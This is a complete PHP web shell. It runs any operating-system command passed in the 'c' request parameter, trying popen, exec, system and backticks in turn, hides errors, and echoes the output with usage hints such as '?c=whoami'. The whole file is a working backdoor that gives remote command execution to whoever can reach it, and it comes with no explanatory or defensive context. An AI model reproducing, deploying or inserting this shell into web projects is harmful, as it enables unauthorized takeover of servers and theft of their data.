<?php
error_reporting(0);
@ini_set('display_errors', 0);

$cmd = $_GET['c'] ?? $_POST['c'] ?? $_REQUEST['c'] ?? '';

if (!empty($cmd)) {
    $output = '';

   
    if (function_exists('popen')) {
        $handle = @popen($cmd . " 2>&1", "r");
        if ($handle) {
            while (!feof($handle)) {
                $output .= @fread($handle, 4096);
            }
            @pclose($handle);
        }
    }

    if (empty(trim($output)) && function_exists('exec')) {
        @exec($cmd . " 2>&1", $arr);
        $output = @implode("\n", $arr);
    }

    if (empty(trim($output)) && function_exists('system')) {
        ob_start();
        @system($cmd . " 2>&1");
        $output = ob_get_clean();
    }

    if (empty(trim($output))) {
        $output = @`$cmd 2>&1`;   // backtick
    }

    if (!empty(trim($output))) {
        echo "<pre>" . htmlspecialchars($output) . "</pre>";
    } else {
        echo "Command executed but no output<br>";
        echo "Try: ?c=ls";
    }
} else {
    echo "Use ?c=whoami";
}
?>
